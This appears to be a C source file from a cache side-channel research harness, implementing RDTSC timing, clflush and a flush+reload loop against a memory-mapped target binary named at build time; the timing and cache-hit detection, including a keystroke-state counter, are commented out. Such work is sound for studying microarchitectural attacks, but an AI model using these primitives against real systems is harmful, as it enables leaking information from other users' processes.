#include <stdio.h>
#include <unistd.h>
#include <math.h>
#include <float.h>
#include <limits.h>
#include <sys/time.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>

#include "sc-attacks.h"

uint64_t rdtsc_begin()
{
	uint64_t a, d;
	asm volatile("mfence\n\t"
		     "CPUID\n\t"
		     "RDTSCP\n\t"
		     "mov %%rdx, %0\n\t"
		     "mov %%rax, %1\n\t"
		     "mfence\n\t"
		     : "=r"(d), "=r"(a)
		     :
		     : "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

uint64_t rdtsc_end()
{
	uint64_t a, d;
	asm volatile("mfence\n\t"
		     "RDTSCP\n\t"
		     "mov %%rdx, %0\n\t"
		     "mov %%rax, %1\n\t"
		     "CPUID\n\t"
		     "mfence\n\t"
		     : "=r"(d), "=r"(a)
		     :
		     : "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

void maccess(void *p)
{
	asm volatile("movq (%0), %%rax\n"
		     :
		     : "c"(p)
		     : "rax");
}

void flush(void *p)
{
	asm volatile("clflush 0(%0)\n"
		     :
		     : "c"(p)
		     : "rax");
}

void flushandreload(void *addr)
{
	// size_t time = rdtsc_begin();
	maccess(addr);
	// rdtsc_end() - time;
	flush(addr);
	//   if (delta < 200)
	//   {
	//     if (kpause > 1000)
	//     {
	//       printf("Cache Hit %10lu after %10lu cycles, t=%10lu us\n", delta, kpause, (time-start)/2600);
	//       keystate = (keystate+1) % 2;
	//     }
	//     kpause = 0;
	//   }
	//   else
	//     kpause++;
}

#define ATTACK_TRIALS (1 << 20)

void execute_side_channel(void)
{
	if (!init_sc())
		return;

#ifndef ATTACK_TARGET
	#error "You must specify the target's path as ATTACK_TARGET param to make"
#endif

	int fd = open(ATTACK_TARGET, O_RDONLY);
	char *addr = (char *)mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
	for (int i = 0; i < ATTACK_TRIALS; i++)
	{
		flushandreload(addr);
	}
}
